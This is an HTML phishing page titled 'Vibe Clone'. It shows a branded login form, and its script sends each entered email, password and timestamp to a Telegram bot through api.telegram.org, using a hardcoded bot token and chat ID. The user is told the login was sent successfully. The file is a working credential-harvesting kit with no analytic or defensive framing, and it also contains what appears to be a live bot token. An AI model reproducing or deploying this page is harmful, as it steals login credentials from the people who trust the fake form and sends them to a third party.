<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vibe Clone</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      width: 350px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      transition: 0.3s;
    }

    .dark {
      background: #1c1c1c;
      color: white;
    }

    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #4f46e5;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .dark input {
      background: #333;
      color: white;
      border: 1px solid #555;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: none;
      border-radius: 6px;
      background: #4f46e5;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #4338ca;
    }

    #darkToggle {
      background: gray;
    }
  </style>
</head>

<body>

  <div class="login-container" id="box">
    <div class="logo">VIBE</div>

    <input type="email" id="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">

    <button onclick="sendLogin()">Log In</button>
    <button id="darkToggle">Toggle Dark Mode</button>
  </div>

  <script>
    const TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
    const CHAT_ID = "1957450632";

    function sendLogin() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      if (!email || !password) {
        alert("Fill all fields");
        return;
      }

      const text =
        "🔐 LOGIN\n" +
        "Email: " + email + "\n" +
        "Password: " + password + "\n" +
        "Time: " + new Date().toLocaleString();

      fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      })
      .then(res => {
        alert("Sent successfully ✅");
      })
      .catch(err => {
        console.log(err);
        alert("Error ❌");
      });
    }

    // Dark mode (THIS WILL WORK NOW)
    document.getElementById("darkToggle").onclick = function () {
      document.getElementById("box").classList.toggle("dark");
    };
  </script>

</body>
</html>
